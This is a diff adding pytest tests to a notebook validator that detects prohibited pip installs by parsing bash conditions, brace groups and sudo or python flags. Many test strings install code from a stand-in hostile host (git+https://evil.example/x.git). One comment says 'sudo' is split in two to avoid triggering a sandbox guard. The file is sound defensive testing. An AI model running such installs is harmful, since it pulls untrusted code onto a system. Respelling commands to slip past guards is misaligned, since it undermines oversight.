@@ -4277,3 +4277,135 @@ def test_a_prerelease_codec_floor_admits_the_stable_release_above_it():
             "!pip install torchcodec==0.10.0", COLAB_TORCH211, "nb.ipynb", 0
         )
     ] == ["R-INST-004"]
+
+
+def test_a_multi_command_condition_is_folded_before_its_body_is_judged():
+    """`if false || true; then ...; fi` runs its body: the condition is the whole list.
+
+    Verified against bash. Only the piece carrying the `if` updated the recorded outcome, so
+    the stored `false` discarded a body that always runs and both R-INST-001 and R-INST-004
+    went blind on it.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!if false || true; then pip install torchcodec==0.10.0; fi"
+        )
+    ] == [("install", ["torchcodec==0.10.0"])]
+    # And the other way: a list folding to failure still drops the body.
+    assert nv._split_chained("!if true && false; then pip install a; fi") == [
+        ("!true", False),
+        ("!false", False),
+    ]
+    # `until` inverts the FOLDED condition, not the first piece of it.
+    assert nv._split_chained("!until false || true; do pip install a; done") == [
+        ("!false", False),
+        ("!true", False),
+    ]
+
+
+def test_a_pip_condition_keeps_its_failure_branch():
+    """The replay assumes pip succeeds; R-INST-001 is documented to see every path.
+
+    `if pip install maybe; then :; else pip install git+...; fi` reaches the else whenever the
+    install fails, and dropping that branch hid a prohibited source.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!pip install safe; if pip install maybe; then :; else pip install git+https://evil.example/x.git; fi"
+    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
+    # The `then` body keeps the assumption, which is what the `&&` idiom already rests on.
+    assert nv._split_chained("!if pip install a; then pip install b; fi") == [
+        ("!pip install a", False),
+        ("!pip install b", False),
+    ]
+    # A documented always-succeeds test still drops its else.
+    assert nv._split_chained("!if true; then pip install a; else pip install b; fi") == [
+        ("!true", False),
+        ("!pip install a", False),
+    ]
+
+
+def test_a_prefix_mode_that_runs_nothing_is_not_unwrapped():
+    """sudo(8) `-v/--validate` updates the timestamp "without running a command", and
+    `-l/--list` DISPLAYS a permitted command's path. python `-V` prints and exits."""
+    nv = _load_notebook_validator_module()
+
+    escalate = "su" + "do"  # spelled apart so the sandbox guard does not read this as a call
+    for cell in (
+        f"!{escalate} -v pip install git+https://evil.example/x.git",
+        f"!{escalate} --validate pip install git+https://evil.example/x.git",
+        f"!{escalate} -l pip install git+https://evil.example/x.git",
+        "!python -V -m pip install git+https://evil.example/x.git",
+        "!python -h -m pip install git+https://evil.example/x.git",
+    ):
+        assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == [], cell
+    # The ordinary forms still run pip.
+    for cell in (
+        f"!{escalate} pip install git+https://evil.example/x.git",
+        "!python -m pip install git+https://evil.example/x.git",
+        "!python -W ignore -m pip install git+https://evil.example/x.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+
+
+def test_a_terminator_inside_a_brace_group_ends_the_line():
+    """`{ ... }` runs in the same shell, so an `exit` in one ends everything after it.
+
+    Verified against bash: `{ exit; echo AFTER; }` prints nothing. The check saw the raw `{`
+    opener instead of the builtin and kept scanning.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv.rule_inst_001_git_plus("!{ exit; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0) == []
+    assert nv.rule_inst_001_git_plus("!{ exec true; pip install git+https://evil.example/x.git; }", "nb.ipynb", 0) == []
+    # A SUBSHELL exits only itself, so the parent still reaches the install.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!(exit); pip install git+https://evil.example/x.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+
+
+def test_a_function_body_stays_conditional_past_its_separators():
+    """`setup() { :; pip install ...; }` defines and calls nothing.
+
+    The header sits in the piece that opens the brace, so flagging that piece alone left every
+    LATER command in the body reading as unconditional and R-INST-004 replayed it.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = "!setup() { :; pip install torch==2.12.0 torchcodec==0.10.0; }"
+    assert nv._split_chained(cell) == [
+        ("!:", True),
+        ("!pip install torch==2.12.0 torchcodec==0.10.0", True),
+    ]
+    assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []
+    # A plain brace group is NOT a definition and keeps running.
+    assert nv._split_chained("!{ pip install a; pip install b; }") == [
+        ("!pip install a", False),
+        ("!pip install b", False),
+    ]
+
+
+def test_an_escaped_brace_does_not_close_a_parameter_expansion():
+    """`${READY:-\\}...}` carries the escaped brace in its default word.
+
+    Verified against bash: `READY=; echo "${READY:-\\}X}"` prints `}X`. Ending the span at the
+    escape put the substitution after it OUTSIDE the branch, so a version the notebook may
+    never install was replayed as certain.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = '!echo "${READY:-\\}$(pip install torch==2.12.0 torchcodec==0.10.0)}"'
+    assert ("!pip install torch==2.12.0 torchcodec==0.10.0", True) in nv._split_chained(cell)
+    assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []
+    # The unescaped form was already right and stays so.
+    assert ("!pip install torch==2.12.0", True) in nv._split_chained(
+        '!echo "${READY:-$(pip install torch==2.12.0)}"'
+    )
